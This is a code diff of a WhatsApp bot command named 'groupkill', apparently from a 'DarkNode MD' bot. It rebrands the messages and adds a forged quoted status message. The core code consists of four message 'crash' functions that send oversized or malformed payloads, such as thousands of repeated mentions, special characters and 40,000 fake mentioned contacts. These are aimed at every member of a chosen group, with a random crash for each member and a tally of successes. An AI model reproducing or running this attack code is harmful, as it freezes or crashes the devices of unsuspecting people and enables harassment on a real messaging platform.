@@ -1,14 +1,44 @@
 // commands/groupkill.js
 const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
+const settings = require('../settings');
+
+const fakeMeta = {
+    key: {
+        participant: '0@s.whatsapp.net',
+        remoteJid: 'status@broadcast',
+        fromMe: false,
+        id: 'DARKNODE_META_' + Date.now()
+    },
+    message: {
+        contactMessage: {
+            displayName: 'DARKNODE MD',
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:DARKNODE MD;;;;\nFN:DARKNODE MD\nTEL;waid=${settings.ownerNumber}:+${settings.ownerNumber}\nEND:VCARD`,
+            sendEphemeral: true
+        }
+    },
+    messageTimestamp: Math.floor(Date.now() / 1000),
+    pushName: 'DARKNODE MD'
+};
+
+const channelInfo = {
+    contextInfo: {
+        forwardingScore: 1,
+        isForwarded: true,
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: settings.newsletterJid,
+            newsletterName: settings.newsletterName,
+            serverMessageId: -1
+        }
+    }
+};
 
 const PROTECTED_NUMBERS = ['254794119486', '254746512735'];
 
-// Collection of all exploit functions (randomly selected)
 const EXPLOITS = [
-    'invis',      // 404sinvis - audio crash
-    'blank',      // 404blank - blank screen freeze
-    'dozer',      // 404dozer - sticker flood
-    'proto'       // 404proto - protocol overload
+    'invis',
+    'blank',
+    'dozer',
+    'proto'
 ];
 
 function extractNumber(jid) {
@@ -22,7 +52,6 @@ function isProtected(number) {
     return PROTECTED_NUMBERS.includes(number);
 }
 
-// Exploit: Invis (audio crash)
 async function sendInvis(sock, target) {
     const generateMessage = {
         viewOnceMessage: {
@@ -58,7 +87,6 @@ async function sendInvis(sock, target) {
     });
 }
 
-// Exploit: Blank (freeze screen)
 async function sendBlank(sock, target) {
     const vampireText = `_*~@2~*_\n`.repeat(10500);
     const privateText = 'ꦽ'.repeat(5000);
@@ -98,7 +126,6 @@ async function sendBlank(sock, target) {
     await sock.relayMessage(target, messageContent, { participant: { jid: target } });
 }
 
-// Exploit: Dozer (sticker flood)
 async function sendDozer(sock, target) {
     const messageContent = {
         viewOnceMessage: {
@@ -132,7 +159,6 @@ async function sendDozer(sock, target) {
     });
 }
 
-// Exploit: Proto (video overload)
 async function sendProto(sock, target) {
     const mentionedList = Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
     const videoMessage = {
@@ -149,9 +175,9 @@ async function sendProto(sock, target) {
         mediaKeyTimestamp: "1748276788",
         contextInfo: { isSampled: true, mentionedJid: mentionedList },
         forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363426838586273@newsletter",
+            newsletterJid: settings.newsletterJid,
             serverMessageId: 1,
-            newsletterName: "404R>Society"
+            newsletterName: settings.newsletterName
         }
     };
     const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
@@ -163,38 +189,41 @@ async function sendProto(sock, target) {
 }
 
 async function groupkillCommand(sock, chatId, message, args) {
-    // Owner-only
     if (!message.key.fromMe) {
-        await sock.sendMessage(chatId, { text: "❌ *Owner Only Command*" }, { quoted: message });
+        await sock.sendMessage(chatId, {
+            text: '╭─── 『 ❌ RESTRICTED 』───⟢\n│ 👤 Owner only command.\n╰────────────⟢\n> © DarkNode MD',
+            ...channelInfo
+        }, { quoted: fakeMeta });
         return;
     }
 
     let targetGroupJid = args[0];
     let isCurrentGroup = false;
 
-    // If no argument provided and in a group, use current group
     if (!targetGroupJid && chatId.endsWith('@g.us')) {
         targetGroupJid = chatId;
         isCurrentGroup = true;
     }
 
     if (!targetGroupJid || !targetGroupJid.endsWith('@g.us')) {
-        await sock.sendMessage(chatId, { 
-            text: "💀 *Group Kill*\n\nUsage:\n• `.groupkill <group_jid>`\n• `.groupkill` (if used inside a target group)\n\nGet group JID from `.listgc` command"
-        }, { quoted: message });
+        await sock.sendMessage(chatId, {
+            text: `╭─── 『 💀 GROUP KILL 』───⟢\n│ 📌 Usage:\n│ • .groupkill <group_jid>\n│ • .groupkill (inside target group)\n│\n│ 💡 Get JID from .listgc\n╰────────────⟢\n> © DarkNode MD`,
+            ...channelInfo
+        }, { quoted: fakeMeta });
         return;
     }
 
-    await sock.sendMessage(chatId, { text: `💀 Initiating group kill on ${targetGroupJid}...` }, { quoted: message });
+    await sock.sendMessage(chatId, {
+        text: `╭─── 『 💀 INITIATING 』───⟢\n│ Targeting ${targetGroupJid}...\n╰────────────⟢\n> © DarkNode MD`,
+        ...channelInfo
+    }, { quoted: fakeMeta });
     await sock.sendMessage(chatId, { react: { text: "💀", key: message.key } });
 
     try {
-        // Get group members
         const groupMetadata = await sock.groupMetadata(targetGroupJid);
         const participants = groupMetadata.participants;
         const botNumber = extractNumber(sock.user.id);
-        
-        // Filter targets (exclude protected numbers and bot itself)
+
         const targets = [];
         for (const p of participants) {
             const num = extractNumber(p.id);
@@ -204,38 +233,34 @@ async function groupkillCommand(sock, chatId, message, args) {
         }
 
         if (targets.length === 0) {
-            await sock.sendMessage(chatId, { text: "🛡️ No valid targets found (all protected or bot itself)." }, { quoted: message });
+            await sock.sendMessage(chatId, {
+                text: '╭─── 『 🛡️ NO TARGETS 』───⟢\n│ All protected or bot itself.\n╰────────────⟢\n> © DarkNode MD',
+                ...channelInfo
+            }, { quoted: fakeMeta });
             return;
         }
 
-        await sock.sendMessage(chatId, { text: `🎯 Targeting ${targets.length} member(s) with random exploits...` }, { quoted: message });
+        await sock.sendMessage(chatId, {
+            text: `╭─── 『 🎯 TARGETING 』───⟢\n│ ${targets.length} member(s) with random exploits...\n╰────────────⟢\n> © DarkNode MD`,
+            ...channelInfo
+        }, { quoted: fakeMeta });
 
         let successCount = 0;
         let failCount = 0;
         const exploitStats = { invis: 0, blank: 0, dozer: 0, proto: 0 };
 
-        // Send random exploit to each target
         for (const target of targets) {
             const randomExploit = EXPLOITS[Math.floor(Math.random() * EXPLOITS.length)];
             exploitStats[randomExploit]++;
-            
+
             try {
                 switch (randomExploit) {
-                    case 'invis':
-                        await sendInvis(sock, target.jid);
-                        break;
-                    case 'blank':
-                        await sendBlank(sock, target.jid);
-                        break;
-                    case 'dozer':
-                        await sendDozer(sock, target.jid);
-                        break;
-                    case 'proto':
-                        await sendProto(sock, target.jid);
-                        break;
+                    case 'invis': await sendInvis(sock, target.jid); break;
+                    case 'blank': await sendBlank(sock, target.jid); break;
+                    case 'dozer': await sendDozer(sock, target.jid); break;
+                    case 'proto': await sendProto(sock, target.jid); break;
                 }
                 successCount++;
-                // Small delay to avoid rate limiting
                 await new Promise(r => setTimeout(r, 500));
             } catch (err) {
                 console.error(`Failed on ${target.number}:`, err.message);
@@ -243,24 +268,17 @@ async function groupkillCommand(sock, chatId, message, args) {
             }
         }
 
-        // Send summary report
-        const report = `💀 *Group Kill Complete*\n\n` +
-            `📊 Targets: ${targets.length}\n` +
-            `✅ Success: ${successCount}\n` +
-            `❌ Failed: ${failCount}\n\n` +
-            `🎲 *Exploit Distribution:*\n` +
-            `🦇 Invis: ${exploitStats.invis}\n` +
-            `📄 Blank: ${exploitStats.blank}\n` +
-            `🚜 Dozer: ${exploitStats.dozer}\n` +
-            `⚡ Proto: ${exploitStats.proto}\n\n` +
-            `> *© 404R>Society*`;
+        const report = `╭─── 『 💀 GROUP KILL COMPLETE 』───⟢\n│ 📊 Targets: ${targets.length}\n│ ✅ Success: ${successCount}\n│ ❌ Failed: ${failCount}\n│\n│ 🎲 *Exploit Distribution:*\n│ 🦇 Invis: ${exploitStats.invis}\n│ 📄 Blank: ${exploitStats.blank}\n│ 🚜 Dozer: ${exploitStats.dozer}\n│ ⚡ Proto: ${exploitStats.proto}\n╰────────────⟢\n> © DarkNode MD`;
 
-        await sock.sendMessage(chatId, { text: report }, { quoted: message });
+        await sock.sendMessage(chatId, { text: report, ...channelInfo }, { quoted: fakeMeta });
         await sock.sendMessage(chatId, { react: { text: "✅", key: message.key } });
 
     } catch (error) {
         console.error('[GroupKill]', error);
-        await sock.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: message });
+        await sock.sendMessage(chatId, {
+            text: `╭─── 『 ❌ ERROR 』───⟢\n│ ${error.message}\n╰────────────⟢\n> © DarkNode MD`,
+            ...channelInfo
+        }, { quoted: fakeMeta });
         await sock.sendMessage(chatId, { react: { text: "❌", key: message.key } });
     }
 }
